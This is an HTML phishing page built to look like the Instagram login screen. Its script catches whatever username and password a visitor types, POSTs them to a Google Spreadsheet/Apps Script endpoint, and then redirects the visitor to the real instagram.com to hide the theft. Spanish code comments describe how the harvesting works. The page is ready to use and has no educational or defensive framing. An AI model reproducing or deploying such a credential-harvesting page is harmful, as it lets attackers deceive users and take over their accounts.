<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            border-radius: 10px;
        }

        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }

        input[type="text"], input[type="password"] {
            width: 80%;
            padding: 8px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            color: white;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
        }

        .divider {
            margin: 20px 0;
            display: flex;
            align-items: center;
            text-align: center;
            color: #8e8e8e;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .login-with-facebook {
            background-color: #3897f0;
            color: white;
            font-weight: bold;
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }

        .forgot-password {
            color: #3897f0;
            font-size: 12px;
            text-decoration: none;
        }

        .sign-up {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .sign-up a {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }

        .terms {
            margin-top: 10px;
            font-size: 10px;
            color: #8e8e8e;
        }

        .terms a {
            color: #00376b;
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo">

    <button class="login-with-facebook">Continue with Facebook</button>

    <div class="divider">OR</div>

    <!-- Formulario que envía los datos al script de Google Apps Script -->
    <form id="login-form">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
        <button class="login-btn" type="submit">Log In</button>
    </form>

    <a class="forgot-password" href="#">Forgot password?</a>

    <div class="sign-up">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="terms">
        By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
    </div>
</div>

<!-- JavaScript para enviar los datos a Google Apps Script y redirigir -->
<script>
    const scriptURL = 'https://docs.google.com/spreadsheets/d/1jCTo_lteXKSO9hglQ01tVF8l94zjk8vzlnwmnf9ltKI/edit?usp=sharing'; // Coloca aquí la URL de tu Google Apps Script publicado
    const form = document.getElementById('login-form');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Evita el envío estándar del formulario

        const formData = new FormData(form); // Crea un objeto FormData con los datos del formulario

        fetch(scriptURL, { method: 'POST', body: formData })
            .then(response => response.text())
            .then(data => {
                console.log('Datos enviados:', data);
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com'; // Redirige después de 0.5 segundos
                }, 500);
            })
            .catch(error => console.error('Error al enviar los datos:', error));
    });
</script>

</body>
</html>
